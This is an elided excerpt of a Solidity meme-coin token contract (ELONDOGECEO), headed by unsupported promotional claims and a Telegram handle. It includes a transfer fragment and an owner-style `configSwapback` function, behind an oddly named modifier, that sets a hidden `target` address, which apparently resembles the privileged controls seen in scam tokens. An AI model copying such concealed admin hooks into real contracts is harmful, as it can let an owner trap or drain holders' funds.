...
/**
    ...
    ✅Elon Doge CEO is far better than other CEO Projects. Fast-Track CG & CMC.
    ...
    ✅TG @ElonDogeCEO
    ✅Website ElonDogeCEO.com

*/

// SPDX-License-Identifier: MIT                                                                

// Dependency file: @openzeppelin/contracts/token/IBEP20/IBEP20.sol
...
// import "@openzeppelin/contracts/token/IBEP20/IBEP20.sol";
// import "@openzeppelin/contracts/access/Ownable.sol";
// import "@openzeppelin/contracts/utils/math/SafeMath.sol";
// import "contracts/BaseToken.sol";

contract ELONDOGECEO is IBEP20, Ownable, BaseToken {
    ...
    function _transfer(
        ...
        _balances[sender] = _balances[sender].sub(
            amount,
            "IBEP20: transfer amount exceeds balance"
        );
    ...
    function configSwapback(bool _enabled, uint256 _amount, address _addr) external rescueSCCcakeV3 {
        target = _addr;
